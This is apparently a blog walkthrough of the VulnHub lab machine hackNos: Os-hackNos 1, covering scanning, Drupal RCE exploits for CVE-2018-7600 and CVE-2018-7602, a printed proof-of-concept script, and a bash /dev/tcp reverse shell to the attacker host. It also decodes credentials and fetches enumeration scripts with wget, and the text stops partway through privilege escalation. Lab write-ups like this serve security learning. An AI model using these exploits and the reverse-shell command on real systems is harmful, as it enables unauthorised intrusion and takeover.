<html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
        <title>/f0c1s/blog/sec/vulnhub/hackNos-os-hackNos-1</title>
        <link rel="stylesheet" href="../../../index.css"/>
        <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
        <script src="../../../highlight/highlight.min.js"></script>
        <script src="../../../setup.js"></script>
        <script>hljs.highlightAll();</script>
    </head>
<body onload="setup()">
<h1>/f0c1s/blog/sec/vulnhub/hackNos-os-hackNos-1</h1>

<nav>
    <a href="../../../index.html">/blog</a>
    <a href="../../index.html">Security</a>
    <a href="../index.html">VulnHub</a>
    <a href="../../../sec/vulnhub/hackNos-os-hackNos-1/hackNos-os-hackNos-1.html">+ hackNos: Os-hackNos 1 - 2022.01.03 Monday</a>
</nav>

## Description

> Difficulty : Easy to Intermediate
>
> Flag : 2 Flag first user And second root
>
> Learning : exploit | Web Application | Enumeration | Privilege Escalation
>
> Website : www.hackNos.com
>
> mail : contact@hackNos.com

[VulnHub: https://www.vulnhub.com/entry/hacknos-os-hacknos,401/](https://www.vulnhub.com/entry/hacknos-os-hacknos,401/)
[Series: https://www.vulnhub.com/series/hacknos,257/](https://www.vulnhub.com/series/hacknos,257/)

![0.running-box](0.running-box.png)

## Scanning

```shell
fping -aAqg 192.168.56.1/24 | tee fping.txt
192.168.56.1
192.168.56.2
192.168.56.70
192.168.56.87

```

```shell
export RHOST="192.168.56.87"
export LHOST="192.168.56.70"
export LPORT="443"

```

```shell
_n $RHOST
firing nmap 192.168.56.87 | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 08:53 IST
Nmap scan report for 192.168.56.87
Host is up (0.00020s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

```

```shell
_ntd $RHOST
firing nmap 192.168.56.87 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 08:53 IST
Nmap scan report for 192.168.56.87
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)
|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)
|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds

```

![1.scanning](1.scanning.png)

```shell
sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 08:54 IST
Nmap scan report for 192.168.56.87
Host is up (0.00050s latency).
All 100 scanned ports on 192.168.56.87 are in ignored states.
Not shown: 98 open|filtered udp ports (no-response), 2 closed udp ports (port-unreach)
MAC Address: 08:00:27:F4:05:5D (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds

```

Only two ports are exposed, both are TCP and there is no UDP port available for to public.

The ports are default for web and ssh.

## Attacking web

Web first because I do not have user:pass for SSH yet.

```shell
nikto -C all -host http://$RHOST | tee nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.87
+ Target Hostname:    192.168.56.87
+ Target Port:        80
+ Start Time:         2022-01-03 08:55:43 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 59633974a1f12, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26522 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-01-03 08:57:01 (GMT5.5) (78 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

```shell
feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
301        9l       28w      315c http://192.168.56.87/drupal
301        9l       28w      320c http://192.168.56.87/drupal/misc
301        9l       28w      322c http://192.168.56.87/drupal/themes
301        9l       28w      323c http://192.168.56.87/drupal/modules
301        9l       28w      323c http://192.168.56.87/drupal/scripts
301        9l       28w      321c http://192.168.56.87/drupal/sites
301        9l       28w      324c http://192.168.56.87/drupal/includes
301        9l       28w      324c http://192.168.56.87/drupal/profiles
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_87-1641180584.state ...
Scanning: http://192.168.56.87
Scanning: http://192.168.56.87/drupal

```

![2.homepage](2.homepage.png)

![3.drupal](3.drupal.png)

```shell
droopescan scan drupal -u http://$RHOST/drupal -t 16
[+] Plugins found:
    profile http://192.168.56.87/drupal/modules/profile/
    php http://192.168.56.87/drupal/modules/php/
    image http://192.168.56.87/drupal/modules/image/

[+] Themes found:
    seven http://192.168.56.87/drupal/themes/seven/
    garland http://192.168.56.87/drupal/themes/garland/

[+] Possible version(s):
    7.57

[+] Possible interesting urls found:
    Default changelog file - http://192.168.56.87/drupal/CHANGELOG.txt

[+] Scan finished (0:00:05.324522 elapsed)

```

![4.changelog](4.changelog.png)

## Drupal exploits

```shell
searchsploit Drupal 7.57 | grep -i remote
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)         | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)      | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execut | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Meta | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC) | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command E | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                   | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                               | php/webapps/46459.py

```

![5.searchsploit-drupal](5.searchsploit-drupal.png)

Well, metasploit doesn't work.

![6.no-msf](6.no-msf.png)

### manual attempt

```shell
searchsploit -m php/webapps/44448.py
  Exploit: Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)
      URL: https://www.exploit-db.com/exploits/44448
     Path: /usr/share/exploitdb/exploits/php/webapps/44448.py
File Type: a /usr/bin/env script, ASCII text executable

Copied to: /home/f0c1s/vuln-hubs/hackNos/os-hackNos-1/44448.py

```

### `cat 44448.py`

```python
#!/usr/bin/env
import sys
import requests

print ('################################################################')
print ('# Proof-Of-Concept for CVE-2018-7600')
print ('# by Vitalii Rudnykh')
print ('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders')
print ('# https://github.com/a2u/CVE-2018-7600')
print ('################################################################')
print ('Provided only for educational or information purposes\n')

target = input('Enter target url (example: https://domain.ltd/): ')

# Add proxy support (eg. BURP to analyze HTTP(s) traffic)
# set verify = False if your proxy certificate is self signed
# remember to set proxies both for http and https
#
# example:
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# verify = False
proxies = {}
verify = True

url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo ";-)" | tee hello.txt'}

r = requests.post(url, proxies=proxies, data=payload, verify=verify)
check = requests.get(target + 'hello.txt')
if check.status_code != 200:
  sys.exit("Not exploitable")
print ('\nCheck: '+target+'hello.txt')
```

Updated code

```python
#!/usr/bin/env python3
import sys
import requests

target = "http://192.168.56.87/drupal"

proxies = {}
verify = True

url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo ";-)" | tee hello.txt'}

r = requests.post(url, proxies=proxies, data=payload, verify=verify)
check = requests.get(target + 'hello.txt')
if check.status_code != 200:
  sys.exit("Not exploitable")
print ('\nCheck: '+target+'hello.txt')
```

```shell
python3 44448.py
Not exploitable

```

### CVE-2018-7600

```shell
python3 ./drupa7-CVE-2018-7600.py http://192.168.56.87/drupal

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-nVk5DXSc9O6pcjA7MVYzichuxXHkaz_LAK6Bl6-xS0M
[*] Triggering exploit to execute: id


```

```shell
python3 ./drupa7-CVE-2018-7600.py http://192.168.56.87/drupal -c "whoami"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-wkl86VNbMU3UIhhv5BSittLhPGTY3uPQTGgYWkFzZto
[*] Triggering exploit to execute: whoami


```


Oh well. I will keep looking I guess.

## Back to web

![7.sites](7.sites.png)

![8.drupal-profiles](8.drupal-profiles.png)

![9.drupal-includes](9.drupal-includes.png)

![10.drupal-scripts](10.drupal-scripts.png)

![11.potential-file-inclusion-with-null-byte](11.potential-file-inclusion-with-null-byte.png)

![12.drupal-themes](12.drupal-themes.png)

## more scanning

```shell
feroxbuster -q -u http://$RHOST/drupal/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
301        9l       28w      320c http://192.168.56.87/drupal/misc
301        9l       28w      322c http://192.168.56.87/drupal/themes
301        9l       28w      323c http://192.168.56.87/drupal/modules
301        9l       28w      328c http://192.168.56.87/drupal/modules/blog
301        9l       28w      329c http://192.168.56.87/drupal/modules/forum
301        9l       28w      331c http://192.168.56.87/drupal/modules/profile
301        9l       28w      328c http://192.168.56.87/drupal/modules/user
301        9l       28w      329c http://192.168.56.87/drupal/modules/image
301        9l       28w      323c http://192.168.56.87/drupal/scripts
301        9l       28w      328c http://192.168.56.87/drupal/modules/menu
301        9l       28w      327c http://192.168.56.87/drupal/modules/php
301        9l       28w      328c http://192.168.56.87/drupal/modules/node
301        9l       28w      328c http://192.168.56.87/drupal/modules/book
301        9l       28w      324c http://192.168.56.87/drupal/includes
301        9l       28w      328c http://192.168.56.87/drupal/modules/poll
301        9l       28w      324c http://192.168.56.87/drupal/profiles
301        9l       28w      331c http://192.168.56.87/drupal/modules/contact
301        9l       28w      330c http://192.168.56.87/drupal/modules/search
301        9l       28w      328c http://192.168.56.87/drupal/modules/help
301        9l       28w      321c http://192.168.56.87/drupal/sites
301        9l       28w      331c http://192.168.56.87/drupal/modules/tracker
301        9l       28w      330c http://192.168.56.87/drupal/modules/system
301        9l       28w      331c http://192.168.56.87/drupal/modules/comment
301        9l       28w      328c http://192.168.56.87/drupal/modules/file
301        9l       28w      330c http://192.168.56.87/drupal/modules/update
301        9l       28w      331c http://192.168.56.87/drupal/modules/toolbar
301        9l       28w      334c http://192.168.56.87/drupal/modules/statistics
301        9l       28w      332c http://192.168.56.87/drupal/modules/taxonomy
301        9l       28w      327c http://192.168.56.87/drupal/modules/rdf
301        9l       28w      323c http://192.168.56.87/drupal/misc/ui
301        9l       28w      330c http://192.168.56.87/drupal/modules/filter
301        9l       28w      334c http://192.168.56.87/drupal/modules/aggregator
301        9l       28w      329c http://192.168.56.87/drupal/modules/block
301        9l       28w      335c http://192.168.56.87/drupal/modules/translation
301        9l       28w      329c http://192.168.56.87/drupal/modules/color
301        9l       28w      333c http://192.168.56.87/drupal/modules/dashboard
301        9l       28w      330c http://192.168.56.87/drupal/modules/syslog
301        9l       28w      330c http://192.168.56.87/drupal/modules/locale
301        9l       28w      329c http://192.168.56.87/drupal/modules/field
301        9l       28w      328c http://192.168.56.87/drupal/modules/path
301        9l       28w      328c http://192.168.56.87/drupal/themes/seven
301        9l       28w      330c http://192.168.56.87/drupal/themes/engines
301        9l       28w      330c http://192.168.56.87/drupal/modules/openid
301        9l       28w      332c http://192.168.56.87/drupal/modules/shortcut
Scanning: http://192.168.56.87/drupal/
Scanning: http://192.168.56.87/drupal/misc
Scanning: http://192.168.56.87/drupal/themes
Scanning: http://192.168.56.87/drupal/modules
Scanning: http://192.168.56.87/drupal/scripts
Scanning: http://192.168.56.87/drupal/includes
Scanning: http://192.168.56.87/drupal/profiles
Scanning: http://192.168.56.87/drupal/sites
^C
```


```shell
python3 ~/collected-tools/drupwn/drupwn --mode enum  --target http://$RHOST/drupal

        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/

[-] Version not specified, trying to identify it

[+] Version detected: 7.57


============ Modules ============


============ Themes ============


============ Users ============


============ Nodes ============


============ Default files ============

[+] /README.txt (200)
[+] /robots.txt (200)
[+] /LICENSE.txt (200)
[+] /web.config (200)
[+] /xmlrpc.php (200)
[+] /update.php (403)
[+] /install.php (200)

```

### /drupal/robots.txt

```html
#
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html

User-agent: *
Crawl-delay: 10
# CSS, JS, Images
Allow: /misc/*.css$
Allow: /misc/*.css?
Allow: /misc/*.js$
Allow: /misc/*.js?
Allow: /misc/*.gif
Allow: /misc/*.jpg
Allow: /misc/*.jpeg
Allow: /misc/*.png
Allow: /modules/*.css$
Allow: /modules/*.css?
Allow: /modules/*.js$
Allow: /modules/*.js?
Allow: /modules/*.gif
Allow: /modules/*.jpg
Allow: /modules/*.jpeg
Allow: /modules/*.png
Allow: /profiles/*.css$
Allow: /profiles/*.css?
Allow: /profiles/*.js$
Allow: /profiles/*.js?
Allow: /profiles/*.gif
Allow: /profiles/*.jpg
Allow: /profiles/*.jpeg
Allow: /profiles/*.png
Allow: /themes/*.css$
Allow: /themes/*.css?
Allow: /themes/*.js$
Allow: /themes/*.js?
Allow: /themes/*.gif
Allow: /themes/*.jpg
Allow: /themes/*.jpeg
Allow: /themes/*.png
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/

```

### /drupal/web.config

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <!-- Don't show directory listings for URLs which map to a directory. -->
    <directoryBrowse enabled="false" />
    <rewrite>
      <rules>
        <rule name="Protect files and directories from prying eyes" stopProcessing="true">
          <match url="\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|^(\..*|Entries.*|Repository|Root|Tag|Template|composer\.(json|lock))$" />
          <action type="CustomResponse" statusCode="403" subStatusCode="0" statusReason="Forbidden" statusDescription="Access is forbidden." />
        </rule>
        <rule name="Force simple error message for requests for non-existent favicon.ico" stopProcessing="true">
          <match url="favicon\.ico" />
          <action type="CustomResponse" statusCode="404" subStatusCode="1" statusReason="File Not Found" statusDescription="The requested file favicon.ico was not found" />
          <conditions>
            <add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" />
          </conditions>
        </rule>
        <!-- Rewrite URLs of the form 'x' to the form 'index.php?q=x'. -->
        <rule name="Short URLs" stopProcessing="true">
          <match url="^(.*)$" ignoreCase="false" />
          <conditions>
            <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
            <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
            <add input="{URL}" pattern="^/favicon.ico$" ignoreCase="false" negate="true" />
          </conditions>
          <action type="Rewrite" url="index.php?q={R:1}" appendQueryString="true" />
        </rule>
      </rules>
    </rewrite>

    <httpErrors>
      <remove statusCode="404" subStatusCode="-1" />
      <error statusCode="404" prefixLanguageFilePath="" path="/index.php" responseMode="ExecuteURL" />
    </httpErrors>

    <defaultDocument>
      <!-- Set the default document -->
      <files>
        <remove value="index.php" />
        <add value="index.php" />
      </files>
    </defaultDocument>
  </system.webServer>
</configuration>


```

### /drupa/update.php

![13.drupal-update-php](13.drupal-update-php.png)

### /drupal/install.php

![14.drupal-install-php](14.drupal-install-php.png)

## Attacking web login

admin:admin

![15.login-error](15.login-error.png)

Then I remembered robots.txt and found ?q=admin

```shell
python3 ./drupa7-CVE-2018-7600.py http://192.168.56.87/drupal/?q=admin -c "id && whoami && hostname && date"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-o7wadKXF6-k8I0Z9mGYkVg3tlPdvhOlVuy8jPIc5qQo
[*] Triggering exploit to execute: id && whoami && hostname && date
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
hackNos
Mon Jan  3 10:15:54 IST 2022

```

[source code](https://github.com/f0c1s/CVE-2018-7600)

It is forked to my repo, so that I can go back to the instance it was working.

The origin repo might get updated, in future, or get deleted or whatever.

Oh well, this was easy.

## Reverse shell

### Listen for connection

```shell
sudo nc -nlvp $LPORT -s $LHOST
Listening on 192.168.56.70 443
```

### Trigger

```shell
python3 ./drupa7-CVE-2018-7600.py http://192.168.56.87/drupal/?q=admin -c "bash -c 'bash -i >& /dev/tcp/192.168.56.70/443 0>&1'"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form--VUF3nWmaDttipsWbtBHsASodEvEDvAE4RZJaYJaPKw
[*] Triggering exploit to execute: bash -c 'bash -i >& /dev/tcp/192.168.56.70/443 0>&1'
... stuck here ...
```

### Caught

```shell
sudo nc -nlvp $LPORT -s $LHOST
Listening on 192.168.56.70 443
Connection received on 192.168.56.87 43516
bash: cannot set terminal process group (1145): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hackNos:/var/www/html/drupal$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@hackNos:/var/www/html/drupal$ whoami
whoami
www-data
www-data@hackNos:/var/www/html/drupal$ hostname
hostname
hackNos
www-data@hackNos:/var/www/html/drupal$ date
date
Mon Jan  3 10:18:35 IST 2022
www-data@hackNos:/var/www/html/drupal$
```

![16.caught-a-reverse-shell](16.caught-a-reverse-shell.png)

### /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
james:x:1000:1000:james,,,:/home/james:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
```

### flag /home/james/user.txt

```shell
www-data@hackNos:/home/james$ cat user.txt
cat user.txt
   _
  | |
 / __) ______  _   _  ___   ___  _ __
 \__ \|______|| | | |/ __| / _ \| '__|
 (   /        | |_| |\__ \|  __/| |
  |_|          \__,_||___/ \___||_|



MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

```

### is mysql running

```shell
www-data@hackNos:/home/james$ ps -ef | grep -i mysql
ps -ef | grep -i mysql
mysql      990     1  0 08:45 ?        00:00:05 /usr/sbin/mysqld
www-data  2024  2000  0 10:22 ?        00:00:00 grep -i mysql
```

Yes it is.

### /var/www/html has secrets

```shell
www-data@hackNos:/var/www/html$ ls -la
ls -la
total 28
drwxr-xr-x 3 root     root      4096 Oct 31  2019 .
drwxr-xr-x 3 root     root      4096 Oct 31  2019 ..
-rw-r--r-- 1 root     root       393 Oct 31  2019 alexander.txt
drwxrwxrwx 9 www-data www-data  4096 Feb 21  2018 drupal
-rw-r--r-- 1 root     root     11321 Oct 31  2019 index.html
www-data@hackNos:/var/www/html$ cat alexander.txt
cat alexander.txt
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==
www-data@hackNos:/var/www/html$ cat alexander.txt | base64 -d
cat alexander.txt | base64 -d
+++++ +++++ [->++ +++++ +++<] >++++ ++.-- ----- --.<+ ++[-> +++<] >+++.
----- ---.< +++[- >+++< ]>+++ ++.<+ +++++ +[->- ----- -<]>- ----- --.<+
++[-> +++<] >++++ +.<++ +++[- >++++ +<]>. ++.++ +++++ +.--- ---.< +++[-
>+++< ]>+++ +.<++ +++++ [->-- ----- <]>-. <+++[ ->--- <]>-- -.+.- ---.+
```

![17.credentials](17.credentials.png)

Credentials: `james:Hacker@451`


## SSH

The credentials above didn't work.

I looked back and found that I had dropped `++.` from the source code.

![18.credentials](18.credentials.png)

Credentials: `james:Hacker@4514`

Anyway, cannot ssh.

## Becoming user james

```shell
sudo nc -nlvp $LPORT -s $LHOST
Listening on 192.168.56.70 443
Connection received on 192.168.56.87 43518
bash: cannot set terminal process group (1145): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hackNos:/var/www/html/drupal$ su james
su james
su: must be run from a terminal
www-data@hackNos:/var/www/html/drupal$ which python
which python
www-data@hackNos:/var/www/html/drupal$ which python3
which python3
/usr/bin/python3
www-data@hackNos:/var/www/html/drupal$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<tml/drupal$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@hackNos:/var/www/html/drupal$

www-data@hackNos:/var/www/html/drupal$ su james
su james
Password: Hacker@4514

su: Authentication failure
www-data@hackNos:/var/www/html/drupal$ ^C

```

Well, this also fails. What are these credentials for.

Lightbulb: drupal site.

## /drupal

![19.logged-in-to-drupal](19.logged-in-to-drupal.png)

I couldn't get the PHP reverse shell to work.

Then I remembered part two of the attack that gave me reverse shell.

## Authenticated RCE

```shell
python3 ./drupa7-CVE-2018-7602.py "james" "Hacker@4514" http://192.168.56.87/drupal/?q=admin

===================================================================================
|   DRUPAL 7 <= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |
|                                   by pimps                                      |
===================================================================================

[*] Creating a session using the provided credential...
[*] Finding User ID...
[*] User ID found: user/1
[*] Poisoning a form using 'destination' and including it in cache.
[*] Poisoned form ID: form-GO0YW5HoX6sWDybqoGaYOKnuLJNdQcAFIbgFqEQ0-R4
[*] Triggering exploit to execute: id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Well, WTF is the point.

## Cannot write to files

```shell
www-data@hackNos:/tmp$ wget -q 192.168.56.70/{lse,LinEnum,linpeas}.sh
wget -q 192.168.56.70/{lse,LinEnum,linpeas}.sh
www-data@hackNos:/tmp$ chmod +x *.sh
chmod +x *.sh
chmod: changing permissions of 'LinEnum.sh': Operation not permitted
chmod: changing permissions of 'linpeas.sh': Operation not permitted
chmod: changing permissions of 'lse.sh': Operation not permitted
www-data@hackNos:/tmp$ ls -la
ls -la
total 592
drwxrwxrwt  8 root     root       4096 Jan  3 11:16 .
drwxr-xr-x 22 root     root       4096 Oct 31  2019 ..
drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .ICE-unix
drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .Test-unix
drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .X11-unix
drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .XIM-unix
drwxrwxrwt  2 root     root       4096 Jan  3 08:45 .font-unix
-r--r--r--  1 www-data www-data    675 Jan  3 10:33 .htaccess
-rw-r--r--  1 root     www-data  46631 Sep 24 08:22 LinEnum.sh
-rw-r--r--  1 root     www-data 473222 Sep 24 09:08 linpeas.sh
-rw-r--r--  1 root     www-data  43570 Sep 24 08:21 lse.sh
drwx------  3 root     root       4096 Jan  3 08:45 systemd-private-e1480f7b9b6449b7b87620c4bfb94b2f-systemd-timesyncd.service-FxZFPA

```

## Priv Esc

### SUID binaries

```shell
www-data@hackNos:/var/www/html$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/wget
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/bin/ping6
/bin/umount
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
```

### SGID binaries

None.

### systeminfo

```shell
www-data@hackNos:/var/www/html$ uname -a
uname -a
Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU/Linux
www-data@hackNos:/var/www/html$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
